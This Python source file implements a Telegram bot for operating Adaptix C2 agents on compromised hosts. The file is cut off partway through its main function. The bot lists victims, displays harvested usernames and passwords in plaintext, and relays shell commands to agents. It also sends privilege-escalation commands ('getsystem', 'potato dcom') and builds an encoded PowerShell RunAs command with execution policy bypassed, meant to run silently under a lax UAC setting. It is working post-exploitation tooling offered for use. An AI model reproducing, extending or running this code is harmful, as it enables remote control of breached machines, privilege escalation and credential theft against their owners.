#!/usr/bin/env python3
"""Whiska Telegram Commander — control Adaptix C2 agents via Telegram bot."""
from __future__ import annotations

import asyncio
import base64
import html
import logging
import os
import random
import string
import sys
import time
from typing import Optional

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from telegram import Update, InlineKeyboardButton as IKB, InlineKeyboardMarkup as IKM
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode

from whiskacli.client import AdaptixClient
from whiskacli.models import DOWNLOAD_STATE_NAMES

logging.basicConfig(format="%(asctime)s [%(name)s] %(levelname)s: %(message)s", level=logging.INFO)
log = logging.getLogger("whiska-tg")

# ─── Config ──────────────────────────────────────────────────────────
# All secrets must be set via environment variables — no defaults.
BOT_TOKEN = os.environ.get("WHISKA_BOT_TOKEN", "")
C2_HOST = os.environ.get("WHISKA_C2_HOST", "")
C2_PORT = int(os.environ.get("WHISKA_C2_PORT", "443"))
C2_ENDPOINT = os.environ.get("WHISKA_C2_ENDPOINT", "/endpoint")
C2_USER_PREFIX = "tg-"
C2_PASS = os.environ.get("WHISKA_C2_PASS", "")
BOT_PASSWORD = os.environ.get("WHISKA_BOT_PASS", "")
MAX_LOGIN_ATTEMPTS = 3
LOCKOUT_SECONDS = 900  # 15 minutes

_authenticated: set[int] = set()
_login_attempts: dict[int, list[float]] = {}  # chat_id -> list of failed timestamps


# ─── Session state ───────────────────────────────────────────────────

class Session:
    def __init__(self):
        self.client: Optional[AdaptixClient] = None
        self.connected = False
        self.agent_id: Optional[str] = None
        self.shell_mode = False
        self.waiting_input: Optional[str] = None

_sessions: dict[int, Session] = {}


def get_sess(cid: int) -> Session:
    if cid not in _sessions:
        _sessions[cid] = Session()
    return _sessions[cid]


# ─── Helpers ─────────────────────────────────────────────────────────

def esc(text) -> str:
    return html.escape(str(text))


def sid(full_id: str) -> str:
    return full_id[:8]


def resolve(client: AdaptixClient, short: str) -> Optional[str]:
    for aid in client.agents:
        if aid.startswith(short):
            return aid
    return None


def ago(ts: int) -> str:
    if ts == 0:
        return "never"
    d = max(0, int(time.time()) - ts)
    if d < 60:
        return f"{d}s"
    if d < 3600:
        return f"{d // 60}m"
    if d < 86400:
        return f"{d // 3600}h"
    return f"{d // 86400}d"


def dot(agent) -> str:
    d = max(0, int(time.time()) - agent.last_tick)
    if d < 30:
        return "\U0001f7e2"
    if d < 300:
        return "\U0001f7e1"
    return "\U0001f534"


async def safe_edit(q, text, **kw):
    try:
        await q.edit_message_text(text, **kw)
    except Exception:
        try:
            await q.message.reply_text(text, **kw)
        except Exception:
            pass


# ─── Keyboards ───────────────────────────────────────────────────────

def kb_main(s: Session) -> IKM:
    c = s.client
    if not c:
        return IKM([[IKB("\U0001f50c Connect", callback_data="connect")]])
    na, nl = len(c.agents), len(c.listeners)
    nc, nt = len(c.credentials), len(c.targets)
    nd, nu = len(c.downloads), len(c.tunnels)
    return IKM([
        [IKB(f"\U0001f5a5 Agents ({na})", callback_data="ag"),
         IKB(f"\U0001f4e1 Listeners ({nl})", callback_data="li")],
        [IKB(f"\U0001f511 Creds ({nc})", callback_data="cr"),
         IKB(f"\U0001f3af Targets ({nt})", callback_data="tg")],
        [IKB(f"\U0001f4e5 Downloads ({nd})", callback_data="dl"),
         IKB(f"\U0001f517 Tunnels ({nu})", callback_data="tu")],
        [IKB("\U0001f4ac Chat", callback_data="ch"),
         IKB("\U0001f4f8 Screenshots", callback_data="sc")],
        [IKB("\U0001f504 Refresh", callback_data="rf"),
         IKB("❌ Disconnect", callback_data="dc")],
    ])


def kb_agents(c: AdaptixClient, page: int = 0) -> IKM:
    agents = sorted(c.agents.items(), key=lambda x: x[1].last_tick, reverse=True)
    per_page = 8
    start = page * per_page
    page_agents = agents[start:start + per_page]
    total_pages = (len(agents) + per_page - 1) // per_page

    rows = []
    for aid, a in page_agents:
        elev = "⚡" if a.elevated else ""
        label = f"{dot(a)} {a.computer}/{a.username} {elev}[{a.arch}] {ago(a.last_tick)}"
        rows.append([IKB(label.strip(), callback_data=f"a:{sid(aid)}")])

    nav = []
    if page > 0:
        nav.append(IKB("◀ Prev", callback_data=f"agp:{page - 1}"))
    if page < total_pages - 1:
        nav.append(IKB("Next ▶", callback_data=f"agp:{page + 1}"))
    if nav:
        rows.append(nav)
    rows.append([IKB("⬅️ Back", callback_data="m")])
    return IKM(rows)


def kb_agent(s: str) -> IKM:
    return IKM([
        [IKB("\U0001f4bb Shell", callback_data=f"sh:{s}"),
         IKB("\U0001f4cb Tasks", callback_data=f"tk:{s}")],
        [IKB("\U0001f53c Elevate", callback_data=f"el:{s}"),
         IKB("ℹ️ Info", callback_data=f"in:{s}")],
        [IKB("⏱ Sleep", callback_data=f"sl:{s}"),
         IKB("❌ Remove", callback_data=f"rm:{s}")],
        [IKB("⬅️ Back", callback_data="ag")],
    ])


def kb_elevate(s: str) -> IKM:
    return IKM([
        [IKB("⬆ GetSystem Token", callback_data=f"gs:{s}:tok"),
         IKB("⬆ GetSystem Task", callback_data=f"gs:{s}:tsk")],
        [IKB("⬆ GetSystem Svc", callback_data=f"gs:{s}:svc"),
         IKB("\U0001f6e1 UAC RunAs", callback_data=f"ur:{s}")],
        [IKB("\U0001f954 Potato DCOM", callback_data=f"pd:{s}")],
        [IKB("⬅️ Back", callback_data=f"a:{s}")],
    ])


def kb_back(target: str = "m") -> IKM:
    return IKM([[IKB("⬅️ Back", callback_data=target)]])


def kb_shell_exit(s: str) -> IKM:
    return IKM([[IKB("⬅️ Exit Shell", callback_data=f"a:{s}")]])


# ─── Auth check ──────────────────────────────────────────────────────

def is_auth(update: Update) -> bool:
    return update.effective_chat.id in _authenticated


# ─── Command handlers ────────────────────────────────────────────────

async def cmd_login(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    cid = update.effective_chat.id
    if cid in _authenticated:
        await update.message.reply_text("✅ Already logged in. Use /start")
        return

    now = time.time()
    attempts = _login_attempts.get(cid, [])
    attempts = [t for t in attempts if now - t < LOCKOUT_SECONDS]
    _login_attempts[cid] = attempts

    if len(attempts) >= MAX_LOGIN_ATTEMPTS:
        remaining = int(LOCKOUT_SECONDS - (now - attempts[0]))
        try:
            await update.message.delete()
        except Exception:
            pass
        await ctx.bot.send_message(
            chat_id=cid,
            text=f"\U0001f512 Too many failed attempts. Try again in {remaining // 60}m {remaining % 60}s")
        log.warning(f"Login lockout: chat_id={cid}")
        return

    args = ctx.args
    if not args:
        await update.message.reply_text("\U0001f510 Usage: /login <password>")
        return

    pw = " ".join(args)
    try:
        await update.message.delete()
    except Exception:
        pass

    if pw == BOT_PASSWORD:
        _login_attempts.pop(cid, None)
        _authenticated.add(cid)
        s = get_sess(cid)
        if s.connected and s.client:
            na = len(s.client.agents)
            status = f"✅ Login OK — C2 connected ({na} agents)\n/start for menu"
        else:
            status = "✅ Login OK. Use /start to connect to C2."
        await ctx.bot.send_message(chat_id=cid, text=status)
        log.info(f"Login success: chat_id={cid}")
    else:
        attempts.append(now)
        _login_attempts[cid] = attempts
        left = MAX_LOGIN_ATTEMPTS - len(attempts)
        msg = "❌ Wrong password"
        if left > 0:
            msg += f" ({left} attempts left)"
        else:
            msg += f"\n\U0001f512 Locked for {LOCKOUT_SECONDS // 60} minutes"
        await ctx.bot.send_message(chat_id=cid, text=msg)
        log.warning(f"Login failed: chat_id={cid}, attempts={len(attempts)}")


async def cmd_logout(update: Update, _):
    cid = update.effective_chat.id
    s = get_sess(cid)
    if s.client:
        s.client.disconnect_ws()
    s.client = None
    s.connected = False
    s.shell_mode = False
    s.agent_id = None
    _authenticated.discard(cid)
    await update.message.reply_text("\U0001f50c Logged out")


async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    cid = update.effective_chat.id
    if cid not in _authenticated:
        await update.message.reply_text(
            "\U0001f431 <b>Whiska Commander</b>\n\n"
            "\U0001f510 Login required.\n"
            "Send: /login &lt;password&gt;",
            parse_mode=ParseMode.HTML)
        return

    s = get_sess(cid)

    if s.connected and s.client:
        await update.message.reply_text(
            "✅ Already connected", reply_markup=kb_main(s))
        return

    msg = await update.message.reply_text("⏳ Connecting to C2...")

    try:
        username = C2_USER_PREFIX + "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
        client = AdaptixClient(C2_HOST, C2_PORT, C2_ENDPOINT, username, C2_PASS)
        await asyncio.to_thread(client.login)
        await asyncio.to_thread(client.connect_ws, auto_reconnect=True)
        await asyncio.to_thread(client.trigger_sync)
        await asyncio.to_thread(client.wait_sync, 30)

        s.client = client
        s.connected = True

        _setup_callbacks(s, cid, ctx.application, asyncio.get_running_loop())

        na, nl = len(client.agents), len(client.listeners)
        nc = len(client.credentials)
        await msg.edit_text(
            f"✅ <b>Connected to C2</b>\n"
            f"\U0001f5a5 Agents: {na} | \U0001f4e1 Listeners: {nl} | \U0001f511 Creds: {nc}\n"
            f"\U0001f464 {esc(username)}@{esc(C2_HOST)}:{C2_PORT}",
            parse_mode=ParseMode.HTML,
            reply_markup=kb_main(s),
        )
    except Exception as e:
        await msg.edit_text(
            f"❌ Connection failed:\n<pre>{esc(str(e))}</pre>",
            parse_mode=ParseMode.HTML)


async def cmd_status(update: Update, _):
    if not is_auth(update):
        await update.message.reply_text("\U0001f510 /login &lt;password&gt; first",
                                        parse_mode=ParseMode.HTML)
        return
    s = get_sess(update.effective_chat.id)
    if not s.connected or not s.client:
        await update.message.reply_text(
            "\U0001f4ca <b>Status</b>\n\n"
            "C2: ❌ Disconnected\n"
            "Use /start to connect",
            parse_mode=ParseMode.HTML)
        return
    c = s.client
    ws = "✅ Connected" if c._ws_connected.is_set() else "❌ Disconnected"
    agent_label = ""
    if s.agent_id and s.agent_id in c.agents:
        a = c.agents[s.agent_id]
        agent_label = f"\n\U0001f3af Agent: {esc(a.computer)}/{esc(a.username)}"
    shell = "✅ Active" if s.shell_mode else "❌ Off"
    await update.message.reply_text(
        f"\U0001f4ca <b>Status</b>\n\n"
        f"C2: {ws}\n"
        f"\U0001f464 User: {esc(c.username)}\n"
        f"\U0001f5a5 Agents: {len(c.agents)} | \U0001f4e1 Listeners: {len(c.listeners)}\n"
        f"\U0001f511 Creds: {len(c.credentials)} | \U0001f3af Targets: {len(c.targets)}\n"
        f"\U0001f41a Shell: {shell}{agent_label}",
        parse_mode=ParseMode.HTML)


async def cmd_help(update: Update, _):
    if not is_auth(update):
        await update.message.reply_text("\U0001f510 /login &lt;password&gt; first",
                                        parse_mode=ParseMode.HTML)
        return
    await update.message.reply_text(
        "\U0001f431 <b>Whiska Telegram Commander</b>\n\n"
        "/start — Connect to C2\n"
        "/status — Show connection status\n"
        "/help — This help\n"
        "/agents — List agents\n"
        "/shell — Enter shell mode\n"
        "/back — Exit shell / main menu\n"
        "/refresh — Re-sync data\n"
        "/disconnect — Disconnect from C2\n"
        "/logout — Logout from bot",
        parse_mode=ParseMode.HTML)


async def cmd_agents(update: Update, _):
    if not is_auth(update):
        return
    s = get_sess(update.effective_chat.id)
    if not s.connected or not s.client:
        await update.message.reply_text("❌ Not connected. /start")
        return
    if not s.client.agents:
        await update.message.reply_text("No agents online")
        return
    await update.message.reply_text(
        "\U0001f5a5 <b>Select Agent</b>",
        parse_mode=ParseMode.HTML,
        reply_markup=kb_agents(s.client))


async def cmd_shell(update: Update, _):
    if not is_auth(update):
        return
    s = get_sess(update.effective_chat.id)
    if not s.connected or not s.agent_id:
        await update.message.reply_text("❌ Select an agent first (/agents)")
        return
    s.shell_mode = True
    s.waiting_input = None
    a = s.client.agents.get(s.agent_id)
    label = f"{a.computer}/{a.username}" if a else s.agent_id[:8]
    await update.message.reply_text(
        f"\U0001f41a <b>Shell</b> — {esc(label)}\nType commands. Output appears as messages.",
        parse_mode=ParseMode.HTML,
        reply_markup=kb_shell_exit(sid(s.agent_id)))


async def cmd_back(update: Update, _):
    s = get_sess(update.effective_chat.id)
    s.shell_mode = False
    s.waiting_input = None
    if s.connected:
        await update.message.reply_text("\U0001f4cb Main Menu", reply_markup=kb_main(s))
    else:
        await update.message.reply_text("/start to connect")


async def cmd_refresh(update: Update, _):
    if not is_auth(update):
        return
    s = get_sess(update.effective_chat.id)
    if not s.connected or not s.client:
        await update.message.reply_text("❌ Not connected")
        return
    try:
        await asyncio.to_thread(s.client.trigger_sync)
        await asyncio.to_thread(s.client.wait_sync, 15)
        await update.message.reply_text("✅ Synced", reply_markup=kb_main(s))
    except Exception as e:
        await update.message.reply_text(f"❌ {e}")


async def cmd_disconnect(update: Update, _):
    s = get_sess(update.effective_chat.id)
    if s.client:
        s.client.disconnect_ws()
    s.client = None
    s.connected = False
    s.shell_mode = False
    s.agent_id = None
    await update.message.reply_text("\U0001f50c Disconnected. /start to reconnect")


# ─── Callback query handler ─────────────────────────────────────────

async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not is_auth(update):
        await safe_edit(q, "⚠️ Session expired. /login &lt;password&gt; to continue",
                        parse_mode=ParseMode.HTML)
        return

    cid = update.effective_chat.id
    s = get_sess(cid)
    data = q.data

    if not s.connected or not s.client:
        await safe_edit(q, "❌ Not connected. /start")
        return

    c = s.client

    # ── Main menu ────────────────────────────────────────────────
    if data == "m":
        s.shell_mode = False
        s.agent_id = None
        s.waiting_input = None
        await safe_edit(q, "\U0001f4cb <b>Main Menu</b>",
                        parse_mode=ParseMode.HTML, reply_markup=kb_main(s))

    # ── Agents list ──────────────────────────────────────────────
    elif data == "ag":
        s.shell_mode = False
        s.agent_id = None
        if not c.agents:
            await safe_edit(q, "No agents", reply_markup=kb_back())
            return
        await safe_edit(q, "\U0001f5a5 <b>Select Agent</b>",
                        parse_mode=ParseMode.HTML, reply_markup=kb_agents(c))

    elif data.startswith("agp:"):
        page = int(data[4:])
        await safe_edit(q, "\U0001f5a5 <b>Select Agent</b>",
                        parse_mode=ParseMode.HTML, reply_markup=kb_agents(c, page))

    # ── Agent selected ───────────────────────────────────────────
    elif data.startswith("a:"):
        short = data[2:]
        aid = resolve(c, short)
        if not aid:
            await safe_edit(q, f"❌ Agent {short} not found", reply_markup=kb_back("ag"))
            return
        s.agent_id = aid
        s.shell_mode = False
        s.waiting_input = None
        a = c.agents[aid]
        text = (
            f"\U0001f5a5 <b>{esc(a.computer)}</b> / {esc(a.username)}\n"
            f"OS: {esc(a.os_desc)} ({esc(a.arch)})\n"
            f"IP: {esc(a.internal_ip)} | Ext: {esc(a.external_ip)}\n"
            f"PID: {esc(a.pid)} | Proc: {esc(a.process)}\n"
            f"Elevated: {'✅' if a.elevated else '❌'} | Sleep: {a.sleep}s\n"
            f"Last: {ago(a.last_tick)} {dot(a)}"
        )
        await safe_edit(q, text, parse_mode=ParseMode.HTML, reply_markup=kb_agent(short))

    # ── Shell mode ───────────────────────────────────────────────
    elif data.startswith("sh:"):
        short = data[3:]
        aid = resolve(c, short)
        if not aid:
            await safe_edit(q, "❌ Agent not found", reply_markup=kb_back("ag"))
            return
        s.agent_id = aid
        s.shell_mode = True
        s.waiting_input = None
        a = c.agents[aid]
        await safe_edit(
            q,
            f"\U0001f41a <b>Shell</b> — {esc(a.computer)}/{esc(a.username)}\n"
            f"Type commands to send. Output appears below.",
            parse_mode=ParseMode.HTML,
            reply_markup=kb_shell_exit(short))

    # ── Tasks ────────────────────────────────────────────────────
    elif data.startswith("tk:"):
        short = data[3:]
        aid = resolve(c, short)
        if not aid:
            await safe_edit(q, "❌ Agent not found", reply_markup=kb_back("ag"))
            return
        tasks = sorted(
            [t for t in c.tasks.values() if t.agent_id == aid],
            key=lambda t: t.start_time, reverse=True)[:20]
        if not tasks:
            await safe_edit(q, "No tasks", reply_markup=kb_back(f"a:{short}"))
            return
        lines = [f"\U0001f4cb <b>Tasks</b> (last {len(tasks)})\n"]
        for t in tasks:
            st = "✅" if t.completed else "⏳"
            cmd = esc(t.cmdline[:80])
            lines.append(f"{st} <code>{cmd}</code>")
            if t.text:
                lines.append(f"  └ {esc(t.text[:150])}")
        text = "\n".join(lines)
        if len(text) > 4000:
            text = text[:4000] + "\n..."
        await safe_edit(q, text, parse_mode=ParseMode.HTML, reply_markup=kb_back(f"a:{short}"))

    # ── Info ─────────────────────────────────────────────────────
    elif data.startswith("in:"):
        short = data[3:]
        aid = resolve(c, short)
        if not aid:
            await safe_edit(q, "❌ Agent not found", reply_markup=kb_back("ag"))
            return
        a = c.agents[aid]
        text = (
            f"ℹ️ <b>Agent Details</b>\n\n"
            f"<b>ID:</b> <code>{esc(a.id)}</code>\n"
            f"<b>Name:</b> {esc(a.name)}\n"
            f"<b>Computer:</b> {esc(a.computer)}\n"
            f"<b>User:</b> {esc(a.display_user)}\n"
            f"<b>Domain:</b> {esc(a.domain)}\n"
            f"<b>OS:</b> {esc(a.os_desc)}\n"
            f"<b>Arch:</b> {esc(a.arch)}\n"
            f"<b>PID:</b> {esc(a.pid)} ({esc(a.process)})\n"
            f"<b>Int IP:</b> {esc(a.internal_ip)}\n"
            f"<b>Ext IP:</b> {esc(a.external_ip)}\n"
            f"<b>Elevated:</b> {'⚡ Yes' if a.elevated else 'No'}\n"
            f"<b>Sleep:</b> {a.sleep}s | Jitter: {a.jitter}%\n"
            f"<b>Listener:</b> {esc(a.listener)}\n"
            f"<b>Tags:</b> {esc(a.tags) or '-'}\n"
            f"<b>Mark:</b> {esc(a.mark) or '-'}\n"
            f"<b>Last Seen:</b> {ago(a.last_tick)}\n"
        )
        await safe_edit(q, text, parse_mode=ParseMode.HTML, reply_markup=kb_back(f"a:{short}"))

    # ── Elevate menu ─────────────────────────────────────────────
    elif data.startswith("el:"):
        short = data[3:]
        await safe_edit(
            q, "\U0001f53c <b>Elevate</b> — select technique",
            parse_mode=ParseMode.HTML, reply_markup=kb_elevate(short))

    # ── GetSystem ────────────────────────────────────────────────
    elif data.startswith("gs:"):
        parts = data.split(":")
        short, method = parts[1], parts[2]
        aid = resolve(c, short)
        if not aid:
            await safe_edit(q, "❌ Agent not found", reply_markup=kb_back("ag"))
            return
        method_map = {"tok": "token", "tsk": "task", "svc": "svc"}
        m = method_map.get(method, "token")
        try:
            await asyncio.to_thread(c.agent_command_raw, aid, f"getsystem {m}")
            await safe_edit(
                q, f"✅ Sent: <code>getsystem {m}</code>",
                parse_mode=ParseMode.HTML, reply_markup=kb_back(f"el:{short}"))
        except Exception as e:
            await safe_edit(
                q, f"❌ {esc(str(e))}",
                parse_mode=ParseMode.HTML, reply_markup=kb_back(f"el:{short}"))

    # ── UAC RunAs ────────────────────────────────────────────────
    elif data.startswith("ur:"):
        short = data[3:]
        s.waiting_input = f"uac_runas:{short}"
        await safe_edit(
            q,
            "\U0001f6e1 <b>UAC RunAs</b>\n"
            "Type the command to run elevated.\n"
            "Silent when ConsentPromptBehaviorAdmin=0.",
            parse_mode=ParseMode.HTML,
            reply_markup=kb_back(f"el:{short}"))

    # ── Potato DCOM ──────────────────────────────────────────────
    elif data.startswith("pd:"):
        short = data[3:]
        aid = resolve(c, short)
        if not aid:
            await safe_edit(q, "❌ Agent not found", reply_markup=kb_back("ag"))
            return
        try:
            await asyncio.to_thread(c.agent_command_raw, aid, "potato dcom")
            await safe_edit(
                q, "✅ Sent: <code>potato dcom</code>",
                parse_mode=ParseMode.HTML, reply_markup=kb_back(f"el:{short}"))
        except Exception as e:
            await safe_edit(
                q, f"❌ {esc(str(e))}",
                parse_mode=ParseMode.HTML, reply_markup=kb_back(f"el:{short}"))

    # ── Sleep prompt ─────────────────────────────────────────────
    elif data.startswith("sl:"):
        short = data[3:]
        s.waiting_input = f"sleep:{short}"
        await safe_edit(
            q, "⏱ Type sleep interval in seconds:",
            reply_markup=kb_back(f"a:{short}"))

    # ── Remove confirm ───────────────────────────────────────────
    elif data.startswith("rm:"):
        short = data[3:]
        await safe_edit(
            q, f"⚠️ Remove agent <code>{esc(short)}</code>?",
            parse_mode=ParseMode.HTML,
            reply_markup=IKM([
                [IKB("✅ Yes", callback_data=f"rmx:{short}"),
                 IKB("❌ Cancel", callback_data=f"a:{short}")],
            ]))

    elif data.startswith("rmx:"):
        short = data[4:]
        aid = resolve(c, short)
        if aid:
            try:
                await asyncio.to_thread(c.agent_remove, [aid])
                s.agent_id = None
                await safe_edit(q, "✅ Agent removed", reply_markup=kb_back("ag"))
            except Exception as e:
                await safe_edit(q, f"❌ {esc(str(e))}",
                                parse_mode=ParseMode.HTML, reply_markup=kb_back("ag"))
        else:
            await safe_edit(q, "❌ Agent not found", reply_markup=kb_back("ag"))

    # ── Listeners ────────────────────────────────────────────────
    elif data == "li":
        if not c.listeners:
            await safe_edit(q, "No listeners", reply_markup=kb_back())
            return
        lines = ["\U0001f4e1 <b>Listeners</b>\n"]
        for name, li in c.listeners.items():
            lines.append(
                f"• <b>{esc(name)}</b> [{esc(li.protocol)}]\n"
                f"  {esc(li.bind_host)}:{esc(li.bind_port)} → {esc(li.agent_addr)}")
        await safe_edit(q, "\n".join(lines)[:4000],
                        parse_mode=ParseMode.HTML, reply_markup=kb_back())

    # ── Credentials ──────────────────────────────────────────────
    elif data == "cr":
        if not c.credentials:
            await safe_edit(q, "No credentials", reply_markup=kb_back())
            return
        lines = [f"\U0001f511 <b>Credentials</b> ({len(c.credentials)})\n"]
        for cred in list(c.credentials.values())[:30]:
            lines.append(
                f"• <code>{esc(cred.username)}</code>:<code>{esc(cred.password)}</code>"
                f" @ {esc(cred.realm or cred.host or '-')}")
        text = "\n".join(lines)
        if len(text) > 4000:
            text = text[:4000] + "\n..."
        await safe_edit(q, text, parse_mode=ParseMode.HTML, reply_markup=kb_back())

    # ── Targets ──────────────────────────────────────────────────
    elif data == "tg":
        if not c.targets:
            await safe_edit(q, "No targets", reply_markup=kb_back())
            return
        lines = ["\U0001f3af <b>Targets</b>\n"]
        for t in c.targets.values():
            alive = "\U0001f7e2" if t.alive else "\U0001f534"
            lines.append(f"{alive} <b>{esc(t.computer)}</b> {esc(t.address)} ({esc(t.os_desc)})")
        await safe_edit(q, "\n".join(lines)[:4000],
                        parse_mode=ParseMode.HTML, reply_markup=kb_back())

    # ── Downloads ────────────────────────────────────────────────
    elif data == "dl":
        if not c.downloads:
            await safe_edit(q, "No downloads", reply_markup=kb_back())
            return
        lines = ["\U0001f4e5 <b>Downloads</b>\n"]
        for d in sorted(c.downloads.values(), key=lambda x: x.date, reverse=True)[:20]:
            state = DOWNLOAD_STATE_NAMES.get(d.state, "?")
            sz = f"{d.total_size // 1024}KB" if d.total_size > 0 else "?"
            lines.append(f"• {esc(d.filename)} ({sz}) [{state}]")
        await safe_edit(q, "\n".join(lines)[:4000],
                        parse_mode=ParseMode.HTML, reply_markup=kb_back())

    # ── Tunnels ──────────────────────────────────────────────────
    elif data == "tu":
        if not c.tunnels:
            await safe_edit(q, "No tunnels", reply_markup=kb_back())
            return
        lines = ["\U0001f517 <b>Tunnels</b>\n"]
        for t in c.tunnels.values():
            lines.append(
                f"• {esc(t.tun_type)} {esc(t.interface)}:{esc(t.port)}"
                f" → {esc(t.fhost)}:{esc(t.fport)} ({esc(t.info)})")
        await safe_edit(q, "\n".join(lines)[:4000],
                        parse_mode=ParseMode.HTML, reply_markup=kb_back())

    # ── Chat ─────────────────────────────────────────────────────
    elif data == "ch":
        msgs = c.chat_messages[-20:]
        if not msgs:
            lines = ["\U0001f4ac <b>Chat</b> — no messages"]
        else:
            lines = ["\U0001f4ac <b>Team Chat</b> (last 20)\n"]
            for m in msgs:
                lines.append(f"<b>{esc(m.username)}</b>: {esc(m.message)}")
        s.waiting_input = "chat"
        text = "\n".join(lines) + "\n\n\U0001f4ac Type a message to send:"
        await safe_edit(q, text[:4000], parse_mode=ParseMode.HTML, reply_markup=kb_back())

    # ── Screenshots ──────────────────────────────────────────────
    elif data == "sc":
        if not c.screenshots:
            await safe_edit(q, "No screenshots", reply_markup=kb_back())
            return
        lines = ["\U0001f4f8 <b>Screenshots</b>\n"]
        for sc in sorted(c.screenshots.values(), key=lambda x: x.date, reverse=True)[:20]:
            lines.append(f"• {esc(sc.computer)}/{esc(sc.user)} — {esc(sc.note or '-')}")
        await safe_edit(q, "\n".join(lines)[:4000],
                        parse_mode=ParseMode.HTML, reply_markup=kb_back())

    # ── Refresh ──────────────────────────────────────────────────
    elif data == "rf":
        try:
            await asyncio.to_thread(c.trigger_sync)
            await asyncio.to_thread(c.wait_sync, 15)
            na, nl = len(c.agents), len(c.listeners)
            await safe_edit(
                q, f"✅ Synced ({na} agents, {nl} listeners)",
                reply_markup=kb_main(s))
        except Exception as e:
            await safe_edit(q, f"❌ Sync error: {esc(str(e))}",
                            parse_mode=ParseMode.HTML, reply_markup=kb_main(s))

    # ── Disconnect ───────────────────────────────────────────────
    elif data == "dc":
        if s.client:
            s.client.disconnect_ws()
        s.client = None
        s.connected = False
        s.shell_mode = False
        s.agent_id = None
        await safe_edit(q, "\U0001f50c Disconnected. /start to reconnect")


# ─── Text message handler ───────────────────────────────────────────

async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_auth(update):
        await update.message.reply_text(
            "⚠️ Session expired. /login &lt;password&gt; to continue",
            parse_mode=ParseMode.HTML)
        return
    cid = update.effective_chat.id
    s = get_sess(cid)
    if not s.connected or not s.client:
        await update.message.reply_text("❌ Not connected. /start")
        return

    c = s.client
    text = update.message.text.strip()
    if not text:
        return

    # ── Waiting for input (sleep value, UAC cmd, chat msg) ───────
    if s.waiting_input:
        wi = s.waiting_input
        s.waiting_input = None

        if wi.startswith("sleep:"):
            short = wi.split(":")[1]
            aid = resolve(c, short)
            if not aid:
                await update.message.reply_text("❌ Agent not found")
                return
            try:
                secs = int(text)
                await asyncio.to_thread(c.agent_update_data, aid, sleep=secs)
                await update.message.reply_text(f"✅ Sleep → {secs}s")
            except ValueError:
                await update.message.reply_text("❌ Not a number")
            except Exception as e:
                await update.message.reply_text(f"❌ {e}")
            return

        if wi.startswith("uac_runas:"):
            short = wi.split(":")[1]
            aid = resolve(c, short)
            if not aid:
                await update.message.reply_text("❌ Agent not found")
                return
            ps = f'Start-Process -Verb RunAs -FilePath "cmd.exe" -ArgumentList "/c {text}"'
            enc = base64.b64encode(ps.encode("utf-16-le")).decode()
            raw = f"ps run -o powershell.exe -ExecutionPolicy Bypass -EncodedCommand {enc}"
            try:
                await asyncio.to_thread(c.agent_command_raw, aid, raw)
                await update.message.reply_text(
                    f"✅ RunAs: <code>{esc(text[:100])}</code>",
                    parse_mode=ParseMode.HTML)
            except Exception as e:
                await update.message.reply_text(f"❌ {e}")
            return

        if wi == "chat":
            try:
                await asyncio.to_thread(c.chat_send, text)
                await update.message.reply_text("✅ Chat sent")
            except Exception as e:
                await update.message.reply_text(f"❌ {e}")
            return

    # ── Shell mode — send to agent ───────────────────────────────
    if s.shell_mode and s.agent_id:
        aid = s.agent_id
        if aid not in c.agents:
            await update.message.reply_text("❌ Agent offline")
            s.shell_mode = False
            return
        try:
            await asyncio.to_thread(c.agent_command_raw, aid, text)
            await update.message.reply_text(
                f"\U0001f4e4 <code>{esc(text[:120])}</code>",
                parse_mode=ParseMode.HTML)
        except Exception as e:
            await update.message.reply_text(f"❌ {esc(str(e))}",
                                            parse_mode=ParseMode.HTML)


# ─── WebSocket callbacks → Telegram ─────────────────────────────────

def _setup_callbacks(s: Session, chat_id: int, app: Application, loop: asyncio.AbstractEventLoop):
    c = s.client

    def _send(text: str, pm=ParseMode.HTML):
        coro = app.bot.send_message(chat_id=chat_id, text=text[:4096], parse_mode=pm)
        asyncio.run_coroutine_threadsafe(coro, loop)

    def on_console(agent_id, ptype, msg_type, message, clear_text):
        log.info(f"[WS] console agent={agent_id[:8]} ptype=0x{ptype:02x} msg_type={msg_type} "
                 f"shell={s.shell_mode} selected={sid(s.agent_id) if s.agent_id else None} "
                 f"msg_len={len(message)} text_len={len(clear_text)}")
        if not s.shell_mode:
            return
        if s.agent_id and agent_id != s.agent_id:
            return
        text = clear_text or message
        if not text.strip():
            return
        chunks = [text[i:i + 4000] for i in range(0, len(text), 4000)]
        for chunk in chunks:
            _send(f"<blockquote>{esc(chunk)}</blockquote>")

    def on_agent_event(event_type, agent):
        if event_type == "new":
            _send(
                f"\U0001f195 <b>New Agent</b>\n"
                f"\U0001f4bb {esc(agent.computer)} / {esc(agent.username)}\n"
                f"\U0001f5a5 {esc(agent.os_desc)} {esc(agent.arch)}\n"
                f"\U0001f310 {esc(agent.internal_ip)}")
        elif event_type == "remove":
            _send(f"\U0001f5d1 Agent removed: {esc(agent.computer)}/{esc(agent.username)}")

    _reconnect_count = [0]

    def on_disconnect():
        _reconnect_count[0] += 1
        if _reconnect_count[0] <= 1:
            _send("⚠️ C2 connection lost. Auto-reconnecting...")
        if _reconnect_count[0] >= 5:
            s.connected = False
            s.shell_mode = False
            _send(
                "❌ C2 reconnect failed after multiple attempts.\n"
                "Server may have restarted.\n"
                "Use /start to reconnect.")

    def on_reconnect():
        _reconnect_count[0] = 0
        _send("✅ C2 reconnected")

    def on_task_update(task):
        if not s.shell_mode:
            return
        if s.agent_id and task.agent_id != s.agent_id:
            return
        if task.completed and task.text:
            text = task.text
            if not text.strip():
                return
            log.info(f"[WS] task_complete agent={task.agent_id[:8]} cmd={task.cmdline[:40]}")
            chunks = [text[i:i + 4000] for i in range(0, len(text), 4000)]
            for chunk in chunks:
                _send(f"<blockquote>{esc(chunk)}</blockquote>")

    c.on_console_output = on_console
    c.on_task_update = on_task_update
    c.on_agent_event = on_agent_event
    c.on_disconnect = on_disconnect
    c.on_reconnect = on_reconnect


# ─── Main ────────────────────────────────────────────────────────────

def main():
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("login", cmd_login))
    app.add_handler(CommandHandler("logout", cmd_logout))
